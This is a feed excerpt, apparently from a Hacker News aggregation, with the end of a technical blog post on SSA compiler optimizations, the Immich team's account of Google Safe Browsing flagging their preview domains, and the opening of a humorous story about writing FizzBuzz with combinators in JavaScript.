    &lt;quote&gt;&lt;p&gt;Not all contributing operations are stores. Some may be references to globals (which we’re disregarding), or function arguments or the results of a function call (which means we probably can’t lift this load). For example&lt;/p&gt;&lt;code&gt;%p&lt;/code&gt;gets traced all the way back to a function argument, there is a code path which loads from a pointer whose stores we can’t see.&lt;/quote&gt;
    &lt;p&gt;It may also trace back to a stack slot that is potentially not stored to. This means there is a code path that can potentially load uninitialized memory. Like LLVM, we can assume this is not observable behavior, so we can discount such dependencies. If all of the dependencies are uninitialized loads, we can potentially delete not just the load, but operations which depend on it (reverse dataflow analysis is the origin of so-called “time-traveling” UB).&lt;/p&gt;
    &lt;head rend="h3"&gt;Lifting Loads&lt;/head&gt;
    &lt;p&gt;Now that we have the full set of dependency information, we can start lifting loads. Loads can be safely lifted when all of their dependencies are stores in the current function, or dependencies we can disregard thanks to UB in the surface language (such as &lt;code&gt;null&lt;/code&gt; loads or uninitialized loads).&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;There is a lot of fuss in this algorithm about plumbing values through block arguments. A lot of IRs make a simplifying change, where every block implicitly receives the registers from its dominators as block arguments.&lt;/p&gt;
      &lt;p&gt;I am keeping the fuss because it makes it clearer what’s going on, but in practice, most of this plumbing, except at dominance frontiers, would be happening in the background.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Suppose we can safely lift some load. Now we need to plumb the stored values down to the load. For each block &lt;code&gt;@b&lt;/code&gt; in &lt;code&gt;subgraph&lt;/code&gt; (all other blocks will now be in &lt;code&gt;subgraph&lt;/code&gt; unless stated otherwise). We will be building two mappings: one &lt;code&gt;(@s, @b) -&amp;gt; %v.s.b&lt;/code&gt;, which is the register equivalent to &lt;code&gt;%v.s&lt;/code&gt; in that block. We will also be building a map &lt;code&gt;@b -&amp;gt; %v.b&lt;/code&gt;, which is the value that &lt;code&gt;%p&lt;/code&gt; must have in that block.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;p&gt;Prepare a work queue, with each&lt;/p&gt;&lt;code&gt;@s&lt;/code&gt;in it initially.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Pop a block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;form the queue. For each successor&lt;code&gt;@b&lt;/code&gt;(in&lt;code&gt;subgraph&lt;/code&gt;):&lt;list rend="ol"&gt;&lt;item&gt;&lt;p&gt;If&lt;/p&gt;&lt;code&gt;%v.b&lt;/code&gt;isn’t already defined, add it as a block argument. Have&lt;code&gt;@a&lt;/code&gt;pass&lt;code&gt;%v.a&lt;/code&gt;to that argument.&lt;/item&gt;&lt;item&gt;&lt;p&gt;If&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;hasn’t been visited yet, and isn’t the block containing the load we’re deleting, add it to the queue.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Once we’re done, if &lt;code&gt;@a&lt;/code&gt; is the block that contains the load, we can now replace all loads to &lt;code&gt;%p&lt;/code&gt; before any stores to &lt;code&gt;%p&lt;/code&gt; with &lt;code&gt;%v.a&lt;/code&gt;.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;There are cases where this whole process can be skipped, by applying a “peephole” optimization. For example, stores followed by loads within the same basic block can be optimized away locally, leaving the heavy-weight analysis for cross-block store/load pairs.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h3"&gt;Worked Example&lt;/head&gt;
    &lt;p&gt;Here’s the result of doing dependency analysis on our Fibonacci function. Each load is annotated with the blocks and stores in &lt;code&gt;stores&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Let’s look at &lt;code&gt;L1&lt;/code&gt;. Is contributing loads are in &lt;code&gt;@entry&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;. So we add a new parameter &lt;code&gt;%n&lt;/code&gt;: in &lt;code&gt;@entry&lt;/code&gt;, we call that parameter with &lt;code&gt;%n&lt;/code&gt; (since that’s stored to it in &lt;code&gt;@entry&lt;/code&gt;), while in &lt;code&gt;@loop.body&lt;/code&gt;, we pass &lt;code&gt;%n.2&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;What about L4? The contributing loads are also in &lt;code&gt;@entry&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;, but one of those isn’t a pred of &lt;code&gt;@exit&lt;/code&gt;. &lt;code&gt;@loop.start&lt;/code&gt; is also in the subgraph for this load, though. So, starting from &lt;code&gt;@entry&lt;/code&gt;, we add a new parameter &lt;code&gt;%a&lt;/code&gt; to &lt;code&gt;@loop.body&lt;/code&gt; and feed &lt;code&gt;0&lt;/code&gt; (the stored value, an immediate this time) through it. Now looking at &lt;code&gt;@loop.body&lt;/code&gt;, we see there is already a parameter for this load (&lt;code&gt;%a&lt;/code&gt;), so we just pass &lt;code&gt;%b&lt;/code&gt; as that argument. Now we process &lt;code&gt;@loop.start&lt;/code&gt;, which &lt;code&gt;@entry&lt;/code&gt; pushed onto the queue. &lt;code&gt;@exit&lt;/code&gt; gets a new parameter &lt;code&gt;%a&lt;/code&gt;, which is fed &lt;code&gt;@loop.start&lt;/code&gt;’s own &lt;code&gt;%a&lt;/code&gt;. We do not re-process &lt;code&gt;@loop.body&lt;/code&gt;, even though it also appears in &lt;code&gt;@loop.start&lt;/code&gt;’s gotos, because we already visited it.&lt;/p&gt;
    &lt;p&gt;After doing this for the other two loads, we get this:&lt;/p&gt;
    &lt;p&gt;After lifting, if we know that a stack slot’s pointer does not escape (i.e., none of its uses wind up going into a function call13) or a write to a global (or a pointer that escapes), we can delete every store to that pointer. If we delete every store to a stack slot, we can delete the stack slot altogether (there should be no loads left for that stack slot at this point).&lt;/p&gt;
    &lt;head rend="h3"&gt;Complications&lt;/head&gt;
    &lt;p&gt;This analysis is simple, because it assumes pointers do not alias in general. Alias analysis is necessary for more accurate dependency analysis. This is necessary, for example, for lifting loads of fields of structs through subobject pointers, and dealing with pointer arithmetic in general.&lt;/p&gt;
    &lt;p&gt;However, our dependency analysis is robust to passing different pointers as arguments to the same block from different predecessors. This is the case that is specifically handled by all of the fussing about with dominance frontiers. This robustness ultimately comes from SSA’s circuital nature.&lt;/p&gt;
    &lt;p&gt;Similarly, this analysis needs to be tweaked to deal with something like &lt;code&gt;select %cond, %a, %b&lt;/code&gt; (a ternary, essentially). &lt;code&gt;select&lt;/code&gt;s of pointers need to be replaced with &lt;code&gt;select&lt;/code&gt;s of the loaded values, which means we need to do the lifting transformation “all at once”: lifting some liftable loads will leave the IR in an inconsistent state, until all of them have been lifted.&lt;/p&gt;
    &lt;head rend="h2"&gt;Cleanup Passes&lt;/head&gt;
    &lt;p&gt;Many optimizations will make a mess of the CFG, so it’s useful to have simple passes that “clean up” the mess left by transformations. Here’s some easy examples.&lt;/p&gt;
    &lt;head rend="h3"&gt;Unused Result Elimination&lt;/head&gt;
    &lt;p&gt;If an operation’s result has zero uses, and the operation has no side-effects, it can be deleted. This allows us to then delete operations that it depended on that now have no side effects. Doing this is very simple, due to the circuital nature of SSA: collect all instructions whose outputs have zero uses, and delete them. Then, examine the defs of their operands; if those operations now have no uses, delete them, and recurse.&lt;/p&gt;
    &lt;p&gt;This bubbles up all the way to block arguments. Deleting block arguments is a bit trickier, but we can use a work queue to do it. Put all of the blocks into a work queue.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Pop a block from the queue.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Run unused result elimination on its operations.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;If it now has parameters with no uses, remove those parameters.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;For each pred, delete the corresponding arguments to this block. Then, Place those preds into the work queue (since some of their operations may have lost their last use).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;If there is still work left, go to 1.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Simplifying the CFG&lt;/head&gt;
    &lt;p&gt;There are many CFG configurations that are redundant and can be simplified to reduce the number of basic blocks.&lt;/p&gt;
    &lt;p&gt;For example, unreachable code can help delete blocks. Other optimizations may cause the &lt;code&gt;goto&lt;/code&gt; at the end of a function to be empty (because all of its successors were optimized away). We treat an empty &lt;code&gt;goto&lt;/code&gt; as being unreachable (since it has no cases!), so we can delete every operation in the block up to the last non-pure operation. If we delete every instruction in the block, we can delete the block entirely, and delete it from its preds’ &lt;code&gt;goto&lt;/code&gt;s. This is a form of dead code elimination, or DCE, which combines with the previous optimization to aggressively delete redundant code.&lt;/p&gt;
    &lt;p&gt;Some jumps are redundant. For example, if a block has exactly one pred and one successor, the pred’s &lt;code&gt;goto&lt;/code&gt; case for that block can be wired directly to the successor. Similarly, if two blocks are each other’s unique predecessor/successor, they can be fused, creating a single block by connecting the input blocks’ circuits directly, instead of through a &lt;code&gt;goto&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;If we have a ternary &lt;code&gt;select&lt;/code&gt; operation, we can do more sophisticated fusion. If a block has two successors, both of which the same unique successor, and those successors consist only of gotos, we can fuse all four blocks, replacing the CFG diamond with a &lt;code&gt;select&lt;/code&gt;. In terms of C, this is this transformation:&lt;/p&gt;
    &lt;p&gt;LLVM’s CFG simplification pass is very sophisticated and can eliminate complex forms of control flow.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;I am hoping to write more about SSA optimization passes. This is a very rich subject, and viewing optimizations in isolation is a great way to understand how a sophisticated optimization pipeline is built out of simple, dumb components.&lt;/p&gt;
    &lt;p&gt;It’s also a practical application of graph theory that shows just how powerful it can be, and (at least in my opinion), is an intuitive setting for understanding graph theory, which can feel very abstract otherwise.&lt;/p&gt;
    &lt;p&gt;In the future, I’d like to cover CSE/GVN, loop optimizations, and, if I’m feeling brave, getting out of SSA into a finite-register machine (backends are not my strong suit!).&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Specifically the Swift frontend before lowering into LLVM IR. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Microsoft Visual C++, a non-conforming C++ compiler sold by Microsoft ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;HotSpot is the JVM implementation provided by OpenJDK; C2 is the “second compiler”, which has the best performance among HotSpot’s Java execution engines. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;V8 is Chromium’s JavaScript runtime. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;SpiderMonkey is Firefox’s JavaScript runtime. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The Android Runtime (ART) is the “JVM” (scare quotes) on the Android platform. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The Glasgow Haskell Compiler (GHC), does not use SSA; it (like some other pure-functional languages) uses a continuation-oriented IR (compare to Scheme’s&lt;/p&gt;&lt;code&gt;call/cc&lt;/code&gt;). ↩&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Every compiler person firmly believes that , because program optimization is full of NP-hard problems and we would have definitely found polynomial ideal register allocation by now if it existed. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Some more recent IRs use a different version of SSA called “structured control flow”, or SCF. Wasm is a notable example of an SCF IR. SSA-SCF is equivalent to SSA-CFG, and polynomial time algorithms exist for losslessly converting between them (LLVM compiling Wasm, for example, converts its CFG into SCF using a “relooping algorithm”).&lt;/p&gt;&lt;p&gt;In SCF, operations like switch statements and loops are represented as macro operations that contain basic blocks. For example, a&lt;/p&gt;&lt;code&gt;switch&lt;/code&gt;operation might take a value as input, select a basic block to execute based on that, and return the value that basic block evaluates to as its output.&lt;p&gt;RVSDG is a notable innovation in this space, because it allows circuit analysis of entire imperative programs.&lt;/p&gt;&lt;p&gt;I am convering SSA-CFG instead of SSA-SCF simply because it’s more common, and because it’s what LLVM IR is.&lt;/p&gt;&lt;p&gt;See also this MLIR presentation for converting between the two. ↩&lt;/p&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Tail calling is when a function call is the last operation in a function; this allows the caller to jump directly to the callee, recycling its own stack frame for it instead of requiring it to allocate its own. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Given any path from&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;, we can make it acyclic by replacing each subpath from&lt;code&gt;@c&lt;/code&gt;to&lt;code&gt;@c&lt;/code&gt;with a single&lt;code&gt;@c&lt;/code&gt;node. ↩&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;When moving from a basic block to a pred, a register in that block which is defined as a block parameter corresponds to some register (or immediate) in each predecessor. That is the “equivalent” of&lt;/p&gt;&lt;code&gt;%p&lt;/code&gt;.&lt;p&gt;One possible option for the “equivalent” is an immediate: for example,&lt;/p&gt;&lt;code&gt;null&lt;/code&gt;or the address of a global. In the case of a global&lt;code&gt;&amp;amp;g&lt;/code&gt;, assuming no data races, we would instead need alias information to tell if stores to this global within the current function (a) exist and (b) are liftable at all.&lt;p&gt;If the equivalent is&lt;/p&gt;&lt;code&gt;null&lt;/code&gt;, we can proceed in one of two ways depending on optimization level. If we want loads of&lt;code&gt;null&lt;/code&gt;to trap (as in Go), we need to mark this load as not being liftable, because it may trap. If we want loads of&lt;code&gt;null&lt;/code&gt;to be UB, we simply ignore that pred, because we can assume (for our analysis) that if the pointer is&lt;code&gt;null&lt;/code&gt;, it is never loaded from. ↩&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Returned stack pointers do not escape: stack slots’ lifetimes end at function exit, so we return a dangling pointer, which we assume are never loaded. So stores to that pointer before returning it can be discarded. ↩&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://mcyoung.xyz/2025/10/21/ssa-1/"/><published>2025-10-22T20:13:31+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45675015</id><title>Google flags Immich sites as dangerous</title><updated>2025-10-23T15:38:01.559847+00:00</updated><content>&lt;doc fingerprint="8912a2d078360380"&gt;
  &lt;main&gt;
    &lt;p&gt;October 20, 2025&lt;/p&gt;
    &lt;p&gt;— Jason Rasmussen&lt;/p&gt;
    &lt;p&gt;Earlier this month all of our &lt;code&gt;*.immich.cloud&lt;/code&gt; websites were marked as dangerous and users started being shown the dreaded "red-screen-of-death" page.&lt;/p&gt;
    &lt;p&gt;No one on the team really understood how this browser feature worked, but it's now, unfortunately, been added to our list of Cursed Knowledge .&lt;/p&gt;
    &lt;p&gt;Google offers a service called Safe Browsing , which aims to determine if a site is running malware, unwanted software, or performs some form of social engineering. The service is free, and many browsers, including Chrome &amp;amp; Firefox, directly integrate the service into their products, although it is still a bit unclear how it actually determines if something is "dangerous".&lt;/p&gt;
    &lt;p&gt;So, what happens if your site is marked as dangerous? Well, since most browsers seem to use this service, your site essentially becomes unavailable for all users, except the few that might realize it's a false positive, click the &lt;code&gt;Details&lt;/code&gt; button, and then see and click the tiny, underlined "visit this safe site" link. So basically it becomes unavailable for your entire audience with little apparent recourse.&lt;/p&gt;
    &lt;p&gt;At some point earlier this month, we realized that a bunch of sites on the &lt;code&gt;immich.cloud&lt;/code&gt; domain had recently started showing up as "dangerous". At the same time, a few users started complaining about their own Immich deployments being flagged. We also noticed that all our own internal sites had the same warning, including our preview environments. It got old real fast to have to go through the tedious effort to "view this safe site" whenever we wanted to view anything.&lt;/p&gt;
    &lt;p&gt;After a few days we realized this warning was not going to go away on its own, and that the Google Search Console was apparently the official way to manage these types of issues. It seems a bit crazy that the only way to make our site available again was to create a Google account, and use the Google Search Console to request a review of the affected site. The service did at least provide a few more details about what exactly was flagged, although it made the whole thing a bit more comical. Per the service:&lt;/p&gt;
    &lt;p&gt;Google has detected harmful content on some of your site’s pages. We recommend that you remove it as soon as possible. Until then, browsers such as Google Chrome will display a warning when users visit or download certain files from your site.&lt;/p&gt;
    &lt;p&gt;and&lt;/p&gt;
    &lt;p&gt;These pages attempt to trick users into doing something dangerous, such as installing unwanted software or revealing personal information.&lt;/p&gt;
    &lt;p&gt;Below these warnings was a list of affected URLs:&lt;/p&gt;
    &lt;code&gt;https://main.preview.internal.immich.cloud/
https://main.preview.internal.immich.cloud/auth/login
https://pr-22838.preview.internal.immich.cloud/
https://pr-22838.preview.internal.immich.cloud/auth/login
...&lt;/code&gt;
    &lt;p&gt;It was super useful to learn that the affected URLs were for our preview environments. Maybe the thought was that these Immich environments were imitating our demo website ? The most alarming thing was realizing that a single flagged subdomain would apparently invalidate the entire domain.&lt;/p&gt;
    &lt;p&gt;This issue affects all of our preview environments and other internal services such as zitadel, outline, grafana, victoria metrics, etc. This also impacts our production tile server, which is deployed at &lt;code&gt;tiles.immich.cloud&lt;/code&gt; . Luckily, the requests to the tile server are made via JavaScript, and since those are not user facing they seem to still be working as expected.&lt;/p&gt;
    &lt;p&gt;The Google Search Console has a &lt;code&gt;Request Review&lt;/code&gt; button, where you can explain how you have resolved the issues. It does warn that:&lt;/p&gt;
    &lt;p&gt;Requesting a review of issues that weren't fixed will result in longer review cycles&lt;/p&gt;
    &lt;p&gt;Since, nothing is actually wrong we decided to respond with the following:&lt;/p&gt;
    &lt;p&gt;Immich is a self-hosted application, and the Immich team (https://immich.app/ ) owns and operates the &lt;code&gt;immich.cloud&lt;/code&gt; domain and subdomains. The flagged sites are our own deployments of our own products and are not impersonating anything or anyone else.&lt;/p&gt;
    &lt;p&gt;A day or two later, the resolution was accepted and the domain was clean again! 🎉&lt;/p&gt;
    &lt;p&gt;We thought we were home free, but unfortunately that was not the case.&lt;/p&gt;
    &lt;p&gt;An Immich preview environment can be requested by adding the &lt;code&gt;preview&lt;/code&gt; label to a pull request on GitHub. When the environment is created, a comment is posted on the pull request with the preview url, which follows the following format:&lt;/p&gt;
    &lt;code&gt;https://pr-&amp;lt;num&amp;gt;.preview.internal.immich.cloud/&lt;/code&gt;
    &lt;p&gt;As soon as we created a new preview environment, the &lt;code&gt;immich.cloud&lt;/code&gt; domain was once again flagged as a dangerous site. The best we can tell, Google crawls GitHub, sees the new URL, crawls the site, marks it as deceptive, and the whole process begins anew.&lt;/p&gt;
    &lt;p&gt;Our current plan is to attempt to minimize the impact of this issue by moving the preview environments to their own, dedicated domain — &lt;code&gt;immich.build&lt;/code&gt; .&lt;/p&gt;
    &lt;p&gt;Google Safe Browsing looks to be have been built without consideration for open-source or self-hosted software. Many popular projects have run into similar issues, such as:&lt;/p&gt;
    &lt;p&gt;Unfortunately, Google seems to have the ability to arbitrarily flag any domain and make it immediately unaccessible to users. I'm not sure what, if anything, can be done when this happens, except constantly request another review from the all mighty Google.&lt;/p&gt;
    &lt;p&gt;Cheers,&lt;lb/&gt;The Immich Team&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://immich.app/blog/google-flags-immich-as-dangerous"/><published>2025-10-22T20:53:49+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45678511</id><title>Programming with Less Than Nothing</title><updated>2025-10-23T15:38:00.899606+00:00</updated><content>&lt;doc fingerprint="bd43d22404bf9be9"&gt;
  &lt;main&gt;
    &lt;p&gt;Dana. The interviewer. Friendly, efficient. She leans forward.&lt;/p&gt;
    &lt;p&gt;“So,” she says, “walk me through FizzBuzz.”&lt;/p&gt;
    &lt;p&gt;You could do this in your sleep. “Is JavaScript okay?”&lt;/p&gt;
    &lt;p&gt;She nods.&lt;/p&gt;
    &lt;p&gt;You open your laptop and begin.&lt;/p&gt;
    &lt;code&gt;let S = (x) =&amp;gt; (y) =&amp;gt; (z) =&amp;gt; x(z)(y(z));
let K = (x) =&amp;gt; (y) =&amp;gt; x;&lt;/code&gt;
    &lt;p&gt;“That should do it,” you say to yourself. “Just need to combine these a few times.”&lt;/p&gt;
    &lt;p&gt;Dana raises an eyebrow. You continue.&lt;/p&gt;
    &lt;code&gt;let I = S(K)(K); // x =&amp;gt; x
let B = S(K(S))(K); // x =&amp;gt; y =&amp;gt; z =&amp;gt; x(y(z))
let C = S(B(B)(S))(K(K)); // x =&amp;gt; y =&amp;gt; z =&amp;gt; x(z)(y)
let W = S(S)(K(I)); // x =&amp;gt; y =&amp;gt; x(y)(y)
let T = C(I); // x =&amp;gt; y =&amp;gt; y(x)&lt;/code&gt;
    &lt;p&gt;Bluebird, cardinal, warbler, thrush. Avian friends you know well.&lt;/p&gt;
    &lt;p&gt;Dana looks puzzled. “Are we still doing FizzBuzz?”&lt;/p&gt;
    &lt;p&gt;“Getting there.”&lt;/p&gt;
    &lt;code&gt;let V = B(C)(T); // x =&amp;gt; y =&amp;gt; z =&amp;gt; z(x)(y)
let R = B(B)(T); // x =&amp;gt; y =&amp;gt; z =&amp;gt; y(z)(x)
let B1 = B(B)(B); // x =&amp;gt; y =&amp;gt; z =&amp;gt; w =&amp;gt; x(y)(z)(w)
let E = B(B1); // x =&amp;gt; y =&amp;gt; z =&amp;gt; w =&amp;gt; v =&amp;gt; x(y)(z(w(v)))
let C_STAR = B(C); // x =&amp;gt; y =&amp;gt; z =&amp;gt; w =&amp;gt; x(y)(w)(z)
let C_STAR_STAR = B(C_STAR); // x =&amp;gt; y =&amp;gt; z =&amp;gt; w =&amp;gt; v =&amp;gt; x(y)(z)(v)(w)&lt;/code&gt;
    &lt;p&gt;Dana breaks away from the screen. “Typically I see a &lt;code&gt;for&lt;/code&gt; loop
by now. Are you sure we’re talking about the same problem?”&lt;/p&gt;
    &lt;p&gt;“Trust me.”&lt;/p&gt;
    &lt;code&gt;let TRUE = K;
let FALSE = K(I);
let NOT = V(FALSE)(TRUE);&lt;/code&gt;
    &lt;p&gt;She stands. “Okay,” she says finally. “Let me stop you there.”&lt;/p&gt;
    &lt;p&gt;“Something wrong?”&lt;/p&gt;
    &lt;p&gt;“You’re not the first candidate to show up here and reinvent programming from first principles using lambda calculus.”&lt;/p&gt;
    &lt;p&gt;You stare, blankly. “Lambda calculus?”&lt;/p&gt;
    &lt;p&gt;“Look,” she says. “We’ve all read Programming with Nothing. We’ve all seen What is PLUS times PLUS. You’re not breaking any new ground here.”&lt;/p&gt;
    &lt;p&gt;You shake your head vigorously. “I would never be caught dead using Lambda calculus. It’s a bloated language.”&lt;/p&gt;
    &lt;p&gt;Dana’s turn to stare. You move on to numbers.&lt;/p&gt;
    &lt;code&gt;let ZERO = I;
let IS_ZERO = T(TRUE);
let SUCC = V(FALSE); // successor
let PRED = T(FALSE); // predecessor
let DECREMENT = S(W(IS_ZERO))(PRED); // clamped predecessor

let ONE = SUCC(ZERO);
let TWO = SUCC(ONE);
let THREE = SUCC(TWO);
let FOUR = SUCC(THREE);
let FIVE = SUCC(FOUR);
let SIX = SUCC(FIVE);
let SEVEN = SUCC(SIX);
let EIGHT = SUCC(SEVEN);
let NINE = SUCC(EIGHT);
let TEN = SUCC(NINE);&lt;/code&gt;
    &lt;p&gt;Dana leans forward. She seems interested now. “Church numerals?”&lt;/p&gt;
    &lt;p&gt;“Barendregt. Church is too mainstream.”&lt;/p&gt;
    &lt;p&gt;You start with a lambda calculus expression.&lt;/p&gt;
    &lt;code&gt;let ADD = (m) =&amp;gt; (n) =&amp;gt; IS_ZERO(m)(n)(SUCC(ADD(PRED(m))(n)));&lt;/code&gt;
    &lt;p&gt;“Dirty,” you mutter. “But it’s a start.”&lt;/p&gt;
    &lt;p&gt;You scribble in your notepad briefly. Showing all your work would be tedious, but you should at least walk her through the interesting parts.&lt;/p&gt;
    &lt;p&gt;“First, we add combinators until &lt;code&gt;n&lt;/code&gt; is by itself on the right.”&lt;/p&gt;
    &lt;code&gt;let ADD = (m) =&amp;gt; (n) =&amp;gt;
  S(C(B(B(B))(IS_ZERO)(m))(SUCC))(ADD(PRED(m)))(n);&lt;/code&gt;
    &lt;p&gt;“Ah,” she says. “Now we can remove &lt;code&gt;n&lt;/code&gt;.”&lt;/p&gt;
    &lt;p&gt;She’s warming up.&lt;/p&gt;
    &lt;code&gt;let ADD = (m) =&amp;gt; S(C(B(B(B))(IS_ZERO)(m))(SUCC))(ADD(PRED(m)));&lt;/code&gt;
    &lt;p&gt;You do it again for &lt;code&gt;m&lt;/code&gt;&lt;/p&gt;
    &lt;code&gt;// let ADD = (m) =&amp;gt;
//   S(B(S)(C_STAR_STAR(B)(C)(B(B(B))(IS_ZERO))(SUCC)))(
//     B(ADD)(PRED),
//   )(m);

let ADD = S(B(S)(C_STAR_STAR(B)(C)(B(B(B))(IS_ZERO))(SUCC)))(
  B(ADD)(PRED),
);&lt;/code&gt;
    &lt;p&gt;Point-free. Clean. But not clean enough.&lt;/p&gt;
    &lt;p&gt;“Now for that pesky self reference…”&lt;/p&gt;
    &lt;code&gt;let ADD_MAKER = (self) =&amp;gt;
  S(B(S)(C_STAR_STAR(B)(C)(B(B(B))(IS_ZERO))(SUCC)))(
    B(self)(PRED),
  );

let Y = W(C)(S(B)(C(W(C)))); // x =&amp;gt; (y =&amp;gt; x(y(y)))(y =&amp;gt; x(y(y)))&lt;/code&gt;
    &lt;p&gt;“Is that the… Y combinator?” Dana asks.&lt;/p&gt;
    &lt;p&gt;“Can’t recurse without it.”&lt;/p&gt;
    &lt;p&gt;“It’s JavaScript. You can literally do recursion without it.”&lt;/p&gt;
    &lt;p&gt;“It won’t be JavaScript for much longer.”&lt;/p&gt;
    &lt;code&gt;let ADD = Y(ADD_MAKER);

console.log(ADD(ONE)(TWO));&lt;/code&gt;
    &lt;p&gt;You run the program for the first time.&lt;/p&gt;
    &lt;code&gt;Uncaught RangeError: Maximum call stack size exceeded&lt;/code&gt;
    &lt;p&gt;Dana smirks. “Well, yeah. JavaScript is an eager language. Can’t use the Y combinator.”&lt;/p&gt;
    &lt;p&gt;You saw this coming. You paste your code into Skoobert.&lt;/p&gt;
    &lt;p&gt;“Skoobert?” Dana asks.&lt;/p&gt;
    &lt;p&gt;“JavaScript but lazy,” you explain. “And without the bloat.”&lt;/p&gt;
    &lt;p&gt;You run it again.&lt;/p&gt;
    &lt;code&gt;[Function]&lt;/code&gt;
    &lt;p&gt;You sigh. Perfect code tarnished by human consumption.&lt;/p&gt;
    &lt;code&gt;let extractNumber = Y(
  B(S(C(IS_ZERO)(0)))(B(B((x) =&amp;gt; x + 1))(C(B)(PRED))),
);

console.log(extractNumber(ADD(ONE)(TWO)));&lt;/code&gt;
    &lt;code&gt;3&lt;/code&gt;
    &lt;p&gt;Back on track. You type faster.&lt;/p&gt;
    &lt;code&gt;let SUBTRACT = C(
  Y(
    B(S(B(S)(C_STAR_STAR(B)(C)(B(B(B))(IS_ZERO))(DECREMENT))))(
      C(S(K(I))(B))(PRED),
    ),
  ),
);

let MULTIPLY = Y(
  B(C)(
    B(S(B(B)(C(IS_ZERO)(ZERO))))(
      B(B(S(ADD)))(C(B(B)(C))(PRED)),
    ),
  ),
);

let LESS_THAN_OR_EQUAL = B1(IS_ZERO)(SUBTRACT);
let GREATER_THAN_OR_EQUAL = C(LESS_THAN_OR_EQUAL);
let GREATER_THAN = B1(NOT)(LESS_THAN_OR_EQUAL);
let LESS_THAN = B1(NOT)(GREATER_THAN_OR_EQUAL);

let RECURSE_SUB = B(B(W))(C(B(B)(B))(SUBTRACT));

let MOD = Y(B(S(B(S)(W(C_STAR(LESS_THAN)))))(RECURSE_SUB));

let DIVIDE = Y(
  B(B(S(C(IS_ZERO)(ZERO))))(
    B(S(B(S)(C(B(C)(LESS_THAN))(ZERO))))(
      B(B(B(SUCC)))(RECURSE_SUB),
    ),
  ),
);&lt;/code&gt;
    &lt;p&gt;Numbers are done. Lists:&lt;/p&gt;
    &lt;code&gt;let CONS = V;
let FIRST = T(TRUE);
let REST = T(FALSE);
let EMPTY = K(TRUE);
let END = EMPTY;
let IS_EMPTY = T(K(K(FALSE)));

let NTH = Y(
  B(S(B(S)(B(C(IS_ZERO))(FIRST))))(
    C(B(C)(B(B(B))(C(B)(REST))))(PRED),
  ),
);

let CONCAT = B(T(CONS))(FOLD);

let RANGE = Y(
  C(
    B(C)(
      B(B(C))(
        B(S(B(S)(LESS_THAN_OR_EQUAL)))(
          B(S(B(B)(CONS)))(C(B)(SUCC)),
        ),
      ),
    ),
  )(EMPTY),
);

let FOLD = Y(
  B(S(B(B)(B(S)(IS_EMPTY))))(
    B(S(B(S)(C(B(B(B))(C(B)(FIRST))))))(C(B)(REST)),
  ),
);

let MAP = C(B(C)(C(B(B)(FOLD))(B(CONS))))(EMPTY);&lt;/code&gt;
    &lt;p&gt;More pretty-printing:&lt;/p&gt;
    &lt;code&gt;let renderList = (fmt) =&amp;gt; (sep) =&amp;gt; (xs) =&amp;gt;
  IS_EMPTY(xs)("")(
    fmt(FIRST(xs)) +
      IS_EMPTY(REST(xs))("")(
        sep + renderList(fmt)(sep)(REST(xs)),
      ),
  );

let showLines = (fmt) =&amp;gt; (list) =&amp;gt; renderList(fmt)("\n")(list);&lt;/code&gt;
    &lt;p&gt;“I won’t bother making the formatters point-free, since they’re just output,” you say, as if Dana cares.&lt;/p&gt;
    &lt;p&gt;Sanity check:&lt;/p&gt;
    &lt;code&gt;console.log(
  showLines(extractNumber)(MAP(RANGE(ONE)(THREE))(SUCC)),
);&lt;/code&gt;
    &lt;code&gt;2
3
4&lt;/code&gt;
    &lt;p&gt;Dana has given up following along.&lt;/p&gt;
